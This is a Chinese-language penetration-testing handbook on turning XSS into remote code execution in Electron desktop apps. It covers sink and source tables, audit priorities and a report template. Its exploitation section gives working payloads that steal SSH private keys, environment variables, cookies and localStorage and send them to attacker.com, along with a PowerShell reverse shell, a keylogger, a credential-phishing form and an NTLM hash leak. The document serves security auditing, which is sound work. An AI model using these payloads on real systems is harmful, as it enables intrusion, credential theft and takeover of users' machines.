# XSS → RCE 攻击链手册

## 概述

在传统 Web 应用中，XSS 通常只能窃取 Cookie 或执行有限操作。但在 Electron 应用中，根据安全配置不同，XSS 可以直接升级为 **远程代码执行（RCE）**，控制用户整台机器。

---

## 一、XSS → RCE 决策树

```
发现 XSS Sink
    ↓
检查 nodeIntegration
    ├── true → [严重] 直接 RCE（场景 1）
    └── false
         ↓
    检查 contextIsolation
         ├── false → [严重] 原型链污染 → RCE（场景 2）
         └── true
              ↓
         检查 contextBridge 暴露面
              ├── 暴露了 exec/require/fs → [严重] Bridge RCE（场景 3）
              ├── 暴露了通用 IPC → [高危] IPC 利用（场景 4）
              ├── 暴露了 shell.openExternal → [高危] 程序执行（场景 5）
              └── 暴露面有限 → [中危] 受限利用（场景 6）
```

---

## 二、XSS Sink 完整列表

### 2.1 原生 DOM

| Sink | 风险 | 检测 Pattern |
|:-----|:-----|:-------------|
| `element.innerHTML = userInput` | 高 | `\.innerHTML\s*=` |
| `element.outerHTML = userInput` | 高 | `\.outerHTML\s*=` |
| `document.write(userInput)` | 高 | `document\.write\(` |
| `document.writeln(userInput)` | 高 | `document\.writeln\(` |
| `element.insertAdjacentHTML(pos, userInput)` | 高 | `\.insertAdjacentHTML\(` |
| `DOMParser.parseFromString(userInput)` | 中 | `parseFromString\(` |
| `Range.createContextualFragment(userInput)` | 中 | `createContextualFragment\(` |

### 2.2 JavaScript 执行

| Sink | 风险 | 检测 Pattern |
|:-----|:-----|:-------------|
| `eval(userInput)` | 高 | `\beval\(` |
| `Function(userInput)()` | 高 | `\bFunction\(` |
| `setTimeout(userInput, delay)` | 高 | `setTimeout\(` + 字符串参数 |
| `setInterval(userInput, delay)` | 高 | `setInterval\(` + 字符串参数 |
| `script.src = userInput` | 高 | `\.src\s*=` |
| `script.textContent = userInput` | 高 | `\.textContent\s*=` + script |
| `new Worker(userInput)` | 中 | `new Worker\(` |

### 2.3 Vue.js

| Sink | 风险 | 检测 Pattern |
|:-----|:-----|:-------------|
| `v-html="userInput"` | 高 | `v-html=` |
| `compile(userTemplate)` | 高 | `compile\(` / `template:` 动态值 |
| `:href="userInput"` | 中 | `:href=` / `v-bind:href=` |
| `:src="userInput"` | 中 | `:src=` / `v-bind:src=` |
| `v-on:[userInput]` | 中 | `v-on:\[` |

### 2.4 React

| Sink | 风险 | 检测 Pattern |
|:-----|:-----|:-------------|
| `dangerouslySetInnerHTML={{__html: userInput}}` | 高 | `dangerouslySetInnerHTML` |
| `href={userInput}` | 中 | `href=\{` + javascript: 可能 |
| `src={userInput}` | 中 | `src=\{` |

### 2.5 jQuery

| Sink | 风险 | 检测 Pattern |
|:-----|:-----|:-------------|
| `$(selector).html(userInput)` | 高 | `\.html\(` |
| `$(selector).append(userInput)` | 高 | `\.append\(` |
| `$(selector).prepend(userInput)` | 高 | `\.prepend\(` |
| `$(selector).after(userInput)` | 高 | `\.after\(` |
| `$(selector).before(userInput)` | 高 | `\.before\(` |
| `$(userInput)` 当参数以 `<` 开头 | 高 | `\$\(` + 动态参数 |
| `$(selector).attr('href', userInput)` | 中 | `\.attr\(` |

---

## 三、XSS Source 列表

### 3.1 Electron 特有 Source

| Source | 来源 | 风险 | 备注 |
|:-------|:-----|:-----|:-----|
| IPC 消息 | `ipcRenderer.on(ch, (e, data) => ...)` | 高 | data 可能未经消毒 |
| Deep Link 参数 | `app.on('open-url', (e, url) => ...)` | 高 | 外部可控 |
| 自定义协议参数 | `protocol.handle` 的请求参数 | 高 | 外部可控 |
| 剪贴板 | `clipboard.readText()` / `readHTML()` | 中 | 用户可控 |
| 拖拽 | `drop` 事件的 `dataTransfer` | 中 | 用户可控 |
| 本地文件读取 | `fs.readFileSync()` 的返回值 | 中 | 内容可控 |
| 命令行参数 | `process.argv` | 低 | 本地可控 |

### 3.2 Web 通用 Source

| Source | 来源 | 风险 |
|:-------|:-----|:-----|
| URL 参数 | `location.search` / `location.hash` | 高 |
| 用户输入 | `input.value` / `textarea.value` | 高 |
| postMessage | `window.addEventListener('message', ...)` | 高 |
| WebSocket | `ws.onmessage` | 中 |
| API 响应 | `fetch/XHR` 返回的数据 | 中 |
| localStorage | `localStorage.getItem()` | 中 |

---

## 四、RCE 利用链详解

### 场景 1: nodeIntegration: true — 直接 RCE

**条件**: `nodeIntegration: true`（最危险的配置）

```javascript
// PoC 1: 弹计算器（Windows）
<img src=x onerror="require('child_process').exec('calc')">

// PoC 2: 弹计算器（macOS）
<img src=x onerror="require('child_process').exec('open -a Calculator')">

// PoC 3: 读取敏感文件
<img src=x onerror="document.body.innerText=require('fs').readFileSync('/etc/passwd','utf8')">

// PoC 4: 窃取 SSH 密钥
<img src=x onerror="
  const os = require('os');
  const fs = require('fs');
  const path = require('path');
  const keyPath = path.join(os.homedir(), '.ssh', 'id_rsa');
  try {
    const key = fs.readFileSync(keyPath, 'utf8');
    new Image().src = 'https://attacker.com/log?key=' + encodeURIComponent(key);
  } catch(e) {}
">

// PoC 5: 窃取环境变量（常含密钥）
<img src=x onerror="
  new Image().src = 'https://attacker.com/log?env=' + btoa(JSON.stringify(process.env));
">

// PoC 6: 反弹 Shell（仅用于授权渗透测试）
// Windows PowerShell
<img src=x onerror="require('child_process').exec('powershell -nop -c \"$client = New-Object Net.Sockets.TCPClient(\\\"attacker.com\\\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\\"PS \\\" + (pwd).Path + \\\"> \\\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"')">
```

**注意**: CSP 对 `require()` 无效。即使有严格的 CSP 策略，`nodeIntegration: true` 时 XSS 仍然可以 RCE。

### 场景 2: contextIsolation: false — 原型链污染

**条件**: `nodeIntegration: false` + `contextIsolation: false`

```javascript
// 原型链污染攻击 — 需要根据具体 preload 代码调整

// 通用探测: 检查是否可以访问 preload 注入的对象
console.log(typeof require);       // function → 直接可用
console.log(typeof process);       // object → 直接可用
console.log(typeof __dirname);     // string → contextIsolation off

// 如果 require 直接可用:
require('child_process').exec('calc');

// 如果 require 不直接可用，但 process 可用:
process.mainModule.require('child_process').exec('calc');

// 如果 process 也不直接可用，尝试原型链污染:
// 步骤 1: 找到 preload 中使用 require 的代码路径
// 步骤 2: 通过原型链污染影响其行为
// 这需要分析具体的 preload 代码
```

### 场景 3: contextBridge 暴露了危险 API

**条件**: `contextIsolation: true` + Bridge 暴露了敏感操作

```javascript
// 如果暴露了命令执行:
<img src=x onerror="window.electronAPI.execute('calc')">
<img src=x onerror="window.api.runCommand('calc')">
<img src=x onerror="window.bridge.exec('whoami')">

// 如果暴露了文件读取:
<img src=x onerror="window.api.readFile('/etc/passwd').then(d=>document.body.innerText=d)">

// 如果暴露了 shell.openExternal:
<img src=x onerror="window.api.openURL('file:///C:/Windows/System32/calc.exe')">
```

### 场景 4: 通用 IPC 通道

**条件**: Bridge 暴露了通用 IPC 发送功能

```javascript
// 如果 Bridge 是 window.api.invoke(channel, data):
// 通过枚举主进程的 ipcMain.handle 找到危险 channel

<img src=x onerror="
  window.api.invoke('shell-exec', {cmd: 'calc'});
">

<img src=x onerror="
  window.api.invoke('read-file', {path: '/etc/passwd'}).then(d => {
    document.body.innerText = d;
  });
">
```

### 场景 5: shell.openExternal

```javascript
// 如果 Bridge 暴露了 openExternal:

// 执行本地程序
<img src=x onerror="window.api.openURL('file:///C:/Windows/System32/calc.exe')">

// NTLM Hash 泄露
<img src=x onerror="window.api.openURL('\\\\attacker.com\\share')">
```

### 场景 6: 受限利用

```javascript
// 即使 Bridge 暴露面有限，XSS 仍然可以:

// 1. 窃取 Cookie
<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">

// 2. 窃取 localStorage
<img src=x onerror="new Image().src='https://attacker.com/?ls='+btoa(JSON.stringify(localStorage))">

// 3. 键盘记录
<img src=x onerror="document.onkeypress=e=>new Image().src='https://attacker.com/?k='+e.key">

// 4. 钓鱼（替换页面内容）
<img src=x onerror="document.body.innerHTML='<h1>Session expired</h1><form action=https://attacker.com/phish><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'">
```

---

## 五、CSP 在 Electron 中的特殊行为

### 5.1 CSP 无法阻止的操作

| 操作 | CSP 能否阻止 | 原因 |
|:-----|:------------|:-----|
| `require('child_process')` | **不能** | Node.js 模块系统不受 CSP 限制 |
| `contextBridge API 调用` | **不能** | JS 函数调用不受 CSP 影响 |
| `ipcRenderer.invoke()` | **不能** | IPC 通信不受 CSP 影响 |
| `<script>alert(1)</script>` | 能 | 内联脚本受 CSP 限制 |
| `<img src=x onerror=...>` | 能 | 事件处理器受 CSP 限制（unsafe-inline） |
| `eval()` | 能 | 受 unsafe-eval 限制 |

### 5.2 CSP 绕过场景

```
场景 1: nodeIntegration: true
  CSP 对 require() 无效
  即使有最严格的 CSP，XSS + require = RCE

场景 2: CSP 有 unsafe-inline
  所有内联脚本和事件处理器可执行

场景 3: CSP 有 unsafe-eval
  eval / Function / setTimeout(string) 可用

场景 4: CSP 允许特定 CDN
  如果允许的 CDN 上有 JSONP 端点或可控内容
  可通过 script-src 加载恶意代码

场景 5: 无 CSP（最常见）
  Electron 应用默认不设置 CSP
  → 完全不受限
```

---

## 六、Sink-Source 追踪方法

### 6.1 静态追踪

```
1. 从 Sink 向上追溯:
   找到 innerHTML = xxx
   → xxx 变量在哪赋值？
   → 赋值来源是 API 响应? IPC 消息? 用户输入?
   → 中间有没有 sanitize/escape 处理?

2. 从 Source 向下追踪:
   找到 ipcRenderer.on('message', (e, data) => ...)
   → data 在 handler 中如何使用？
   → 是否传给了 innerHTML/v-html 等 Sink？
   → 中间有没有消毒处理？

3. 跨文件追踪:
   通过 import/require/IPC 通道名关联
   Source 文件 → 处理文件 → Sink 文件
```

### 6.2 动态追踪（配合 js-reverse MCP）

```
1. 在 Sink 处设置断点:
   set_breakpoint(file, line)

2. 触发功能（输入数据/发送消息等）

3. 断点命中后:
   evaluate_on_callframe 检查变量值
   查看调用栈确认数据来源

4. 逐帧分析数据流
```

### 6.3 审计优先级

```
优先级排序（从高到低）:

① nodeIntegration:true 窗口中的 XSS Sink
   → 直接 RCE，最高优先级

② contextIsolation:false 环境中的 XSS Sink
   → 原型链污染 → RCE

③ 有危险 Bridge 暴露的页面中的 XSS Sink
   → 通过 Bridge → RCE

④ 自定义协议 handler 中的参数注入
   → 外部可触发的 XSS

⑤ IPC 消息中的未消毒数据 → DOM Sink
   → 需要控制 IPC 来源

⑥ API 响应中的未消毒数据 → DOM Sink
   → 需要控制/劫持 API
```

---

## 七、产出模板

```markdown
## XSS → RCE 分析

### 安全模型

| 配置 | 值 | 影响 |
|:-----|:---|:-----|
| nodeIntegration | true/false | |
| contextIsolation | true/false | |
| sandbox | true/false | |
| CSP | 有/无 + 具体策略 | |
| Bridge 暴露面 | [方法列表] | |

### 发现的 XSS Sink

| # | 文件:行号 | Sink 类型 | 所在页面的安全模型 | RCE 可能性 |
|---|:---------|:----------|:------------------|:----------|
| 1 | xxx.js:YY | innerHTML | nodeIntegration:true | 严重 |

### 完整利用链

=== [C-ELECTRON-XXX] XSS → RCE ===

Source: [数据来源]
  ↓ [传递过程]
Sink: [具体 Sink 代码]
  ↓ [利用方式]
RCE: [代码执行方式]

验证 PoC:
```html
[可直接复现的 PoC]
```

前置条件:
  - [x] 条件 1
  - [x] 条件 2

影响: [能做什么]
```
